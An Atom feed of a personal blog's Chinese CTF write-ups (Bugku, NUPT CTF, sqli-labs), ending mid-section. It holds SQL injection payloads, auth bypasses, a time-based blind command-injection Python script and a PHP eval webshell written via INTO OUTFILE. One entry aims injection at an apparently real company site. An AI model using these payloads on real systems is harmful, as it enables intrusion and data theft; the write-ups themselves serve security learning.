<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>super/guo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.mr-guo.xin/"/>
  <updated>2018-10-06T07:03:39.881Z</updated>
  <id>http://www.mr-guo.xin/</id>
  
  <author>
    <name>super/guo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUGKU</title>
    <link href="http://www.mr-guo.xin/2018/09/29/BUGKU/"/>
    <id>http://www.mr-guo.xin/2018/09/29/BUGKU/</id>
    <published>2018-09-29T00:11:31.000Z</published>
    <updated>2018-10-06T07:03:39.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><a id="more"></a><h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><pre><code>查看源码提示需要post参数margin带查找到的值，抓包发现flag参数</code></pre><h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><pre><code>进入发现页面只有一句话，查看源代码发现1p.html，访问发现页面出现跳转，抓包查看发现大段字符串</code></pre><p><img src="/2018/09/29/BUGKU/10-03/never01.png" alt=""></p><pre><code>先base64解码，再url解码发现php代码段</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!<span class="variable">$_GET</span>['id'])</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">    exit();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  <span class="variable">$id</span>=<span class="variable">$_GET</span>['id'];</span></span><br><span class="line"><span class="string">  <span class="variable">$a</span>=<span class="variable">$_GET</span>['a'];</span></span><br><span class="line"><span class="string">  <span class="variable">$b</span>=<span class="variable">$_GET</span>['b'];</span></span><br><span class="line"><span class="string">  if(stripos(<span class="variable">$a</span>,'.'))</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">    return ;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  <span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,'r');</span></span><br><span class="line"><span class="string">  if(<span class="variable">$data</span>=="</span>bugku is a nice plateform!<span class="string">" and <span class="variable">$id</span>==0 and strlen(<span class="variable">$b</span>)&gt;5 and eregi("</span>111<span class="string">".substr(<span class="variable">$b</span>,0,1),"</span>1114<span class="string">") and substr(<span class="variable">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><pre><code>这题有个bug直接访问文件就可以得到flag</code></pre><h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><pre><code>注入半天也没注出什么，参考了一下writeup知道是ds_store源码泄露，运行ds_store源码读取脚本，运行后如下</code></pre><p><img src="/2018/09/29/BUGKU/10-06/sql注入2.png" alt=""></p><pre><code>（附上脚本地址： https://pypi.org/project/ds_store/1.1.0/）发现有flag文件，脚本会自动下载文件到本地，打开flag文件得到flag</code></pre><h3 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h3><pre><code>进入后出现登录界面，首先尝试用万能密码登录无果；抓包发现响应包里有tip</code></pre><p><img src="/2018/09/29/BUGKU/10-03/login2.png" alt=""></p><p>base64解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.<span class="variable">$username</span>.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">'password'</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>登录的流程为：1.根据输入的用户名查询出用户名和口令2.对比输入的口令的md5值和查询出的口令是否相等接下来构造payload：  username:   &apos; union select null,&apos;c4ca4238a0b923820dcc509a6f75849b&apos; #      // &apos;闭合前面的查询语句，使使查询语句结果的password永远返回1的md5值  password:   1成功登录后进入远程监控系统，尝试了各种命令执行绕过发现这里可以通过执行sleep函数来进行命令盲注（此处参考了一些writeup）构造payload：  postdata： c=123;a=`ls`;b=&quot;a&quot;;if [ ${a:0:1} == $b ];then sleep 2;fi  //读取目录这里自己用python写了个脚本，贴上代码（本人是新手，写的比较粗糙）,首先跑出目录，会发现有flag字样的txt文件，在用脚本读取出文件内容发现flag</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">stri=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, '</span></span><br><span class="line">url=<span class="string">'http://123.206.31.85:49165/index.php'</span></span><br><span class="line">data_post= &#123;<span class="string">'c'</span>:<span class="string">'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'hbccmcbln7ul8lc0hgh2q9rrg4'</span>&#125; <span class="comment">#登录成功后拿取cookie</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,50):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> stri:</span><br><span class="line">    <span class="comment"># 查看目录</span></span><br><span class="line">    data_post[<span class="string">'c'</span>] = <span class="string">"c=123;a=`ls`;b=\""</span> + y + <span class="string">"\";if [ <span class="variable">$&#123;a:" + str(x) + ":1&#125;</span> == <span class="variable">$b</span> ];then sleep 2;fi"</span> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 查看文件内容</span></span><br><span class="line">    <span class="comment">#data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi"</span></span><br><span class="line">    <span class="built_in">print</span>(data_post)</span><br><span class="line">    r = requests.post(url,data=data_post,cookies=cookies)</span><br><span class="line">    time = r.elapsed.seconds</span><br><span class="line">    <span class="keyword">if</span> time&gt;1:</span><br><span class="line">      result += y</span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="WEB进阶"><a href="#WEB进阶" class="headerlink" title="WEB进阶"></a>WEB进阶</h2><h3 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h3><pre><code>转了一会发现about菜单的news界面可能存在注入点，访问http://www.kabelindo.co.id/readnews.php?id=25 and 1=2发现页面返回异常确认注入点。payload：    ?id=25 order by 5  //确认列数     ?id=125 union select 1,substr((group_concat(table_name)),100,150),3,4,5 from information_schema.tables where table_schema=database() //获取最后一个表名提交</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;
    
    </summary>
    
      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
    
    
      <category term="ctf" scheme="http://www.mr-guo.xin/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NYCtf</title>
    <link href="http://www.mr-guo.xin/2018/09/26/NYCtf/"/>
    <id>http://www.mr-guo.xin/2018/09/26/NYCtf/</id>
    <published>2018-09-26T02:29:37.000Z</published>
    <updated>2018-10-06T07:41:44.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="南邮ctf-无图"><a href="#南邮ctf-无图" class="headerlink" title="南邮ctf(无图)"></a>南邮ctf(无图)</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看页面源代码就ok了</p><a id="more"></a><h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>看题目知道是md5碰撞，只需要找到另一串md5加密后为0x开头的字符</p><h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>输入发现有字符长度限制，F12打开调试界面修改input的maxlength</p><h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>绕了一圈什么也没发现，数据包也没发现异常，猜测图片做了手脚，保存到本地用winhex查看，发现末尾出现flag</p><h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>页面上显示的时js颜文字，直接复制到F12后出现控制台回车得到flag，如果页面显示乱码，先调整浏览器的编码为unicode</p><h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>抓包得到flag</p><h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>这题在网上搜了一些资料，方法就是把eval修改为echo就能输出flag</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>点击链接发现参数file<br>用php伪协议读取index.php文件<br>发现一串base64加密后的字符串<br>解密后发现flag</p><h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>依旧通过抓包发现flag</p><h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>抓包发现cookie中有login参数值为0，TIP: 0==not，修改为1返回flag</p><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>根据页面提示查看robots.txt文件，发现php代码片段，根据提示在sql.php页面提交id参数，判断需要提交的id值为1024，这里利用了intval()方法的一个特性，intval()方法处理浮点数时会忽略后面的小数部分，这样在查询数据库时id为1024，而进行比较时为1024和1024.xxx作比较达到绕过的目的</p><h3 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h3><p>题目提示为宽字节注入</p><p>payload：<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> order by 2 %23  确定有两列<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 发现有多张表<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23  逐个表查询列名，这里有一点需要注意的是，表名处无法绕过引号转译，就替换为16进制依然能达到绕过<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,flag from ctf4 %23  最后查询到flag</p><h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>题目提示有多种解法，首先想到的是利用数组进行绕过</p><p>payload： <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=123" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=123</a></p><p>另一种方法是通过ereg函数的漏洞：%00截断</p><p>payload： <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=123%00%23biubiubiu" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=123%00%23biubiubiu</a></p><p>可能存在别的方法目前还没了解到</p><h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>md5加密后为0x的开头的字符串会被认为是相同的，可以构造如下payload</p><p><a href="http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO</a></p><p>或者使用数组绕过，payload</p><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=123&amp;b[]=234" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a[]=123&amp;b[]=234</a></p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>页面提供了源代码链接，进入查看代码审计构造data数据</p><p>pass=1&amp;thepassword_123=1</p><p>达到覆盖原变量值的目的，得到flag</p><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>上传图片文件提示需要上传php文件，上传php文件提示需要上传图片文件<br>抓包查看响应包中的内容，做出如下判断：<br>  1.判断上传文件的后缀是否为图片常用后缀<br>  2.判断上传路径中的文件后缀是否为php后缀</p><p>在上传路径中利用%00截断漏洞实现绕过：/uploads/1.php%00，这里%00还需要进行url编码，或者直接进入hex界面修改相应位置为00，发送后返回flag</p><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>查看源码构造payload：</p><p>账号为：admin’) #<br>密码为任意<br>得到flag</p><h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>检查题目提供的源码<br>先使用数组成功绕过得到flag</p><h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>发现链接中有base64之后的值，转换后发现是用户名，修改为admin做base64<br>post添加以下参数：<br>user=admin&amp;newpass=123&amp;vcode=1234<br>提交返回flag</p><h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>打开页面发现是一串jsfuck，复制到控制台页面返回1bc29b36f623ba82aaf6724fd3b16718.php<br>访问此文件出现：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>抓包发现响应包中的提示：history of bash<br>查了一下资料，需要访问这个文件  .bash_history<br>发现一个命令行，发现flagbak.zip，下载解压后发现flag</p><p>###sql注入2</p><pre><code>查看提供的源码</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">    mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line">    <span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line">    <span class="variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='<span class="variable">$user</span>'"</span>)); //根据输入的用户名查找用户口令</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$query</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$query</span>[pw]))) &#123;     //判断查询出的用户口令是否和用户输入的口令的md5值相等</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>postdate：  user=&apos; union select &apos;c4ca4238a0b923820dcc509a6f75849b    //使查询语句返回为1的md5值  pass=1</code></pre><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>进入后页面空白，查看源代码发现代码段，通过php伪协议php://input读取数据流<br>payload： view-source:<a href="http://chinalover.sinaapp.com/web23/?file=php://input" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web23/?file=php://input</a><br>data： meizijiu<br>返回flag</p><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>右键查看源代码，构造payload：view-source:<a href="http://chinalover.sinaapp.com/web24/?name=meizijiu233" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web24/?name=meizijiu233</a><br>返回flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;南邮ctf-无图&quot;&gt;&lt;a href=&quot;#南邮ctf-无图&quot; class=&quot;headerlink&quot; title=&quot;南邮ctf(无图)&quot;&gt;&lt;/a&gt;南邮ctf(无图)&lt;/h2&gt;&lt;h3 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到题&lt;/h3&gt;&lt;p&gt;查看页面源代码就ok了&lt;/p&gt;
    
    </summary>
    
      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
    
    
      <category term="ctf" scheme="http://www.mr-guo.xin/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs解题思路</title>
    <link href="http://www.mr-guo.xin/2018/07/06/sql-labs/"/>
    <id>http://www.mr-guo.xin/2018/07/06/sql-labs/</id>
    <published>2018-07-06T01:11:36.735Z</published>
    <updated>2018-09-18T10:34:43.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-10-解题思路"><a href="#1-10-解题思路" class="headerlink" title="1-10/解题思路"></a>1-10/解题思路</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1 GET-Error based-Single quotes-String"></a>Less-1 GET-Error based-Single quotes-String</h3><pre><code>首先是正常的查询界面</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-32-16.png" alt=""></p><!-- 发现返回不同用户信息，可以判断为字符型注入![](sql-labs/sql-01/2018-07-06-10-54-07.png) --><a id="more"></a><pre><code>输入单引号可以看到报错信息，根据报错信息可以知道输入的id被单引号包裹，接下来猜字段。</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-34-04.png" alt=""></p><pre><code>order by后的数字大于3的时候页面会返回报错信息，也就是表里有3个字段。这里的 %23 是 # 的url编码，用于注释。</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-38-36.png" alt=""></p><pre><code>接下来构造联合查询语句，这里页面没有变化的原因是后台只显示返回的查询结果的第一条记录。</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-47-59.png" alt=""></p><pre><code>可以让联合查询的左边查询结果为空，那么就会显示右边的查询结果</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-50-46.png" alt=""></p><pre><code>接下来就可以利用各种数据库函数查看数据库信息。</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-56-37.png" alt=""></p><pre><code>接下来爆表名，构造下面的语句,这里后台会限制查询结果的显示个数，所以利用了 group_concat() 函数?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-10-18.png" alt=""></p><pre><code>接下来就继续爆列名，这里以 users 表为例，构造下列语句。?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; %23</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-15-50.png" alt=""></p><pre><code>然后构造下面的语句可以查询到所有用户的信息?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users %23</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-17-55.png" alt=""></p><h3 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2 GET-Error based-Intiger based"></a>Less-2 GET-Error based-Intiger based</h3><pre><code>输入单引号可以看到报错信息，可以判断为数字型注入</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-14-54-41.png" alt=""><br><!-- ![](sql-labs/sql-02/2018-07-06-10-59-19.png) --></p><pre><code>判断字段数为3</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-01-55.png" alt=""></p><pre><code>联合查询</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-02-52.png" alt=""></p><pre><code>爆表名</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-04-06.png" alt=""></p><pre><code>爆列名</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-05-13.png" alt=""></p><pre><code>爆出所有用户信息</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-06-42.png" alt=""></p><h3 id="Less-3-GET-Error-based-Single-with-twist-String"><a href="#Less-3-GET-Error-based-Single-with-twist-String" class="headerlink" title="Less-3 GET-Error based-Single with twist-String"></a>Less-3 GET-Error based-Single with twist-String</h3><!-- 依次查询 id=1 以及 id=2-1,页面返回不同用户信息，可以判断为字符型注入![](sql-labs/sql-03/2018-07-06-11-09-00.png) --><pre><code>添加单引号页面返回报错信息，可以知道 id 被 (&apos;&apos;) 包裹</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-10-29.png" alt=""></p><pre><code>判断字段数为3</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-12-19.png" alt=""></p><pre><code>联合查询</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-13-01.png" alt=""></p><pre><code>爆表名</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-15-22.png" alt=""></p><pre><code>爆列名</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-16-44.png" alt=""></p><pre><code>爆出所有用户信息</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-18-00.png" alt=""></p><h3 id="Less-4-GET-Error-based-Double-quotes-String"><a href="#Less-4-GET-Error-based-Double-quotes-String" class="headerlink" title="Less-4 GET-Error based-Double quotes-String"></a>Less-4 GET-Error based-Double quotes-String</h3><!-- 依次查询 id=1 以及 id=2-1,页面返回不同用户信息，可以判断为字符型注入![](sql-labs/sql-04/2018-07-06-11-20-40.png) --><pre><code>添加双引号页面返回报错信息，id 被 (&quot;&quot;) 包裹</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-02.png" alt=""></p><pre><code>判断字段数为3</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-56.png" alt=""></p><pre><code>联合查询</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-34-34.png" alt=""></p><pre><code>爆表名</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-02.png" alt=""></p><pre><code>爆列名</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-39.png" alt=""></p><pre><code>爆出所有用户信息</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-34-28.png" alt=""></p><h3 id="Less-5-GET-Double-injection-Single-quotes-String"><a href="#Less-5-GET-Double-injection-Single-quotes-String" class="headerlink" title="Less-5 GET-Double injection-Single quotes-String"></a>Less-5 GET-Double injection-Single quotes-String</h3><pre><code>道题我的思路是盲注，之后参考了一下别人的writeup知道是双查询注入，题目也是提示，然后了解了一下双查询注入是有固定的语句：?id=1&apos; union select count(*),2,concat((select database()),floor(rand()*2))a from information_schema.tables group by a %23database()可以替换成需要查询的数据标题有提示是单引号，然后判断字段数为3</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-08-06.png" alt=""></p><pre><code>然后使用双查询注入，这里报错显示的security0去掉后面的0就是当前使用的数据库名</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-15-55-27.png" alt=""></p><pre><code>接着爆表名，这里直接查询表名会出现以下报错信息，需要用limit限定范围</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-13-56.png" alt=""><br><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-17-51.png" alt=""></p><pre><code>接着爆列名，同上。</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-19-45.png" alt=""></p><pre><code>爆数据</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-20-51.png" alt=""></p><h3 id="Less-6-GET-Double-injection-Double-quotes-String"><a href="#Less-6-GET-Double-injection-Double-quotes-String" class="headerlink" title="Less-6 GET-Double injection-Double quotes-String"></a>Less-6 GET-Double injection-Double quotes-String</h3><pre><code>和上一题的步骤一样，但是要把单引号替换为双引号。</code></pre><h3 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7 GET-Dump into outfile-String"></a>Less-7 GET-Dump into outfile-String</h3><pre><code>这题看了一下源码和别人的思路。先在之前的关卡获取到数据库的路径：@@basedir获取mysql的安装路径，@@datadir获取mysql的数据路径网站的根目录就是 &apos;C:/phpStudy/PHPTutorial/WWW/&apos;</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-08-54-23.png" alt=""></p><pre><code>这里执行后会发现文件并没有写入目录，查了一下资料是因为缺少权限：mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本都默认为空，之后都为null，null为禁用数据的导入导出，空为变量无效。</code></pre><!-- ![](sql-labs/sql-07/2018-07-08-09-19-53.png) --><pre><code>查看secure_file_priv全局系统变量</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-01-33.png" alt=""></p><pre><code>为了测试把修改本地的my.ini文件并重启服务</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-23-07.png" alt=""></p><pre><code>构造如下语句：?id=1&apos;)) union select 1,database(),user() into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test.txt&apos;  %23执行后页面会如图显示</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-37-59.png" alt=""></p><pre><code>但是查看www目录，可以看到生成了test.txt文件</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-34-21.png" alt=""></p><pre><code>构造下面的语句导出users表数据?id=1&apos;)) union select 1,group_concat(username),group_concat(password) from users into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test2.txt&apos;  %23</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-36-55.png" alt=""></p><pre><code>然后可以写入一句话木马?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&apos;  %23</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-41-20.png" alt=""></p><h3 id="Less-8-GET-Blind-Boolian-based-Single-quotes"><a href="#Less-8-GET-Blind-Boolian-based-Single-quotes" class="headerlink" title="Less-8 GET-Blind-Boolian based-Single quotes"></a>Less-8 GET-Blind-Boolian based-Single quotes</h3><pre><code>这题是布尔盲注，查询为空时页面会不同</code></pre><p><img src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-06.png" alt=""><br><img src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-22.png" alt=""></p><pre><code>猜测字段为3</code></pre><p><img 